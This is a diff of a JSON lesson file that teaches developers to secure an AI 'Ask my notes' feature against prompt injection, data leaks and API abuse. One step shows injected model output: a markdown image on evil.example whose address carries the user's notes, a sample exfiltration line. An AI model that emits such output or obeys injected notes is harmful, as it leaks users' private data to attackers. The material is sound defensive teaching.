@@ -42,7 +42,7 @@
       "title": "Notely learns to answer questions",
       "chapter": "setup",
       "body": [
-        "Notely gets <b>Ask my notes</b>. Maya types a question in her browser. The <span class=\"term\">app server</span> (Notely's code) reads her notes from the database and sends them, with the question, to the <span class=\"term\">Claude API</span>, Anthropic's AI.",
+        "Notely gets <b>Ask my notes</b>. Maya types a question in her browser. The <span class=\"term\">app server</span> (Notely's code) reads her notes from the database, where notes live, and sends them, with the question, to the <span class=\"term\">Claude API</span>, Anthropic's AI.",
         "Claude can also ask for a <span class=\"term\">tool</span>: a function Notely's code runs for it. Here, one that sends email."
       ],
       "callout": {
@@ -284,8 +284,8 @@
       "title": "Shrink what a fooled model can do",
       "chapter": "how",
       "body": [
-        "Apply <span class=\"term\">least privilege</span>. Tools run with Maya's own login token, never the service role key, so the database's row rules limit them to her rows.",
-        "And a tool with side effects, like sending, deleting or paying, never runs on the model's say-so. Notely shows Maya a draft and sends only when she clicks."
+        "Apply <span class=\"term\">least privilege</span>: give each tool only the power its job needs. Reading Maya's own notes is low risk. Sending, deleting or paying is not.",
+        "So a tool with side effects like those never runs on the model's say-so. Notely shows Maya a draft and sends only when she clicks."
       ],
       "code": {
         "language": "ts",
@@ -295,7 +295,8 @@
       "changes": [
         "~ Email Tool: only drafts, Maya clicks Send",
         "~ Browser: shows the draft, the odd address stands out",
-        "~ Notes leaked 40 → 0"
+        "~ Notes leaked 40 → 0",
+        "~ Database and Shared Note lose their leg labels"
       ],
       "metrics": {
         "leaked": {
@@ -350,8 +351,8 @@
       "title": "What goes in can come out",
       "chapter": "how",
       "body": [
-        "Anything in the <span class=\"term\">context</span> (all the text the model reads) can end up in an answer. If a search pulls Ben's notes into Maya's question, a clever prompt will surface them. Filter <em>before</em> the model: search with Maya's token, so row rules apply.",
-        "And keep secrets out of system prompts. Users can often get the model to repeat them."
+        "Anything in the <span class=\"term\">context</span> (all the text the model reads) can come out. If the search uses Supabase's admin key, other users' notes slip in, and a prompt can surface them. Filter <em>before</em> the model: search with Maya's token, so row rules apply.",
+        "Keep secrets out of system prompts too: users can often make the model repeat them."
       ],
       "callout": {
         "type": "tip",
@@ -359,7 +360,8 @@
       },
       "changes": [
         "~ Database: hands over only Maya's rows",
-        "~ Email Tool and Shared Note step back"
+        "~ Email Tool and Shared Note step back",
+        "~ Browser and Claude API back in view"
       ],
       "scene": {
         "extends": "previous",
@@ -422,18 +424,20 @@
       "title": "The image that leaks without a click",
       "chapter": "watch-out",
       "body": [
-        "A sneakier way out: the injected note asks Claude to end its answer with an image whose web address holds Maya's notes. If the chat shows images, her browser fetches that address on its own. That is <span class=\"term\">exfiltration</span>, no tool needed.",
-        "Never load images from unknown sites in model output. Add a <span class=\"term\">Content Security Policy</span>."
+        "A sneakier way out: the note tells Claude to add an image whose web address holds Maya's notes. If the chat shows images, her browser fetches that address by itself: <span class=\"term\">exfiltration</span>, no tool needed.",
+        "So never load images from unknown sites. A <span class=\"term\">Content Security Policy</span> enforces it: a list of the only sites the page may load from."
       ],
       "code": {
         "language": "text",
         "filename": "Model output, after injection",
-        "code": "Here is your weekly summary…\n![](https://evil.example/p.png?d=MAYA_NOTES_HERE)"
+        "code": "Here is your weekly summary…\n![](https://evil.example/p.png?d=MAYA_NOTES_HERE)",
+        "caption": "In markdown, ![](address) means: show the image found at this address."
       },
       "changes": [
         "+ Attacker Site: logs whatever its web addresses carry",
         "− Email Tool",
-        "~ Browser: refuses images from unknown sites"
+        "~ Browser: refuses images from unknown sites",
+        "~ Shared Note back in view: it holds the injection"
       ],
       "scene": {
         "extends": "previous",
@@ -491,7 +495,7 @@
       "title": "Your API key, someone else's app",
       "chapter": "problem",
       "body": [
-        "Notely's ask route, the server address the browser calls, answers anyone. It has become a free Claude proxy, paid by Notely.",
+        "Notely's ask route, the server address the browser calls, answers anyone. It has become a free door to Claude, paid for by Notely.",
         "A stranger's script finds it and loops it all night, sending long texts each time. Every call goes to Claude on Notely's key."
       ],
       "changes": [
@@ -573,7 +577,7 @@
       "chapter": "how",
       "body": [
         "Require login. Limit calls per user (rate limiting, from the system design course). Cap the input size and <span class=\"term\">max_tokens</span>, the longest answer Claude may write.",
-        "Then set a spend limit and usage alerts in the provider's console. Sign-ups are free, so that limit is the final ceiling."
+        "Then set a spend limit and usage alerts in the provider's console. Anyone can open many free accounts, so that limit is the final ceiling."
       ],
       "code": {
         "language": "ts",
@@ -584,7 +588,8 @@
       "changes": [
         "~ App Server: login, per-user limit, size caps",
         "~ Script: turned away",
-        "~ AI bill 900 → 5 $/day"
+        "~ AI bill 900 → 5 $/day",
+        "~ Browser and Claude API back to normal"
       ],
       "metrics": {
         "bill": {
@@ -646,8 +651,8 @@
       "title": "Recap: the trifecta on your own laptop",
       "chapter": "recap",
       "body": [
-        "A model cannot tell orders from data. So break the <b>lethal trifecta</b>: filter data by user first, give tools the user's own rights, require a click for side effects, and guard every AI route.",
-        "Claude Code has the same three legs: your repo, web pages, a shell. Keep permission prompts on, and trust only MCP servers (plug-in tools) you know."
+        "Models mix up orders and data. So filter data by user, give tools the user's rights, require a click for side effects, and guard every AI route.",
+        "Claude Code has all three legs of the <b>lethal trifecta</b>: your repo (private data), web pages (untrusted content) and a shell (terminal) that sends data out. So keep its permission prompts on."
       ],
       "callout": {
         "type": "claude-code",
